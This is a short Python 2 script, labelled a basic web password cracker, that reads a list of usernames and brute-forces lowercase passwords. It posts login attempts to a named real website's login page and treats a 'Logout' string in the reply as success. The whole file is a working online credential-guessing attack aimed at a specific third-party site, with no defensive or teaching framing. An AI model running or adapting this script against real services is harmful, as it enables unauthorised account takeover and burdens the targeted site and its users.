# Basic Web Password Cracker
# Wayne Kenney / github.com/LogicPy

import requests
from time import sleep
import sys
import itertools, random, string, time
import time
pwToBrute='aa'

startTime = int(time.time())

alphabet = string.ascii_lowercase

def generateRandPw(charLength):
    outStr = ''
    while len(outStr) < charLength:
        outStr += random.choice(alphabet)
    return outStr
randPw = generateRandPw(4)

def convertTuple(tup):
        # initialize an empty string
    str = ''
    for item in tup:
        str = str + item
    return str

# Global Variables
url = "https://giantessworld.net/user.php?action=login"
userList = open('usersBrute.txt', 'r').read().split('\n')

# Login Function
def login(username,password):

	form_data = {
		'penname': username,
		'password': password,
		'submit': 'Go',
	}

	header_data = { }

	r = requests.post(url,data=form_data,headers=header_data)

	check = r.text.encode("utf-8").find("Logout")

	return check

# Successful Authentication
def cracked(username, password):
	"\n password cracked (%s:%s) \n" % (username, password)
	x = raw_input("\n Press ENTER to exit \n")
	sys.exit()

# Main Function
def main():
	global url
	global userList
	global pwList
	global pwTobrute

	pwToBrute='aa'

	print "\n Cracker Activated \n"
	index = 0
	estimatedTime = int((alphabet.index(pwToBrute[0]) / len(alphabet)) * (len(alphabet) ** len(pwToBrute)))
	pwTuple = tuple(pwToBrute)
	#charList = [[x for x in alphabet]] * (len(pwToBrute)+index)

	for user in userList:
		# increment concatenation variable value for letter count per cycle
		charList = [[x for x in alphabet]] * (len(pwToBrute)+index)
		index += 1 # increment index variable for username looping with password auto character increasing

		for pw in itertools.product(*charList):
			str = convertTuple(pw)
			pw2 = str 
			print " %s:%s" % (user,pw2)
			out = login(user,pw2)
			if out == -1:
				pass
			else:
				cracked(user,pw2)

# Call Main - Begin Cracking
main()	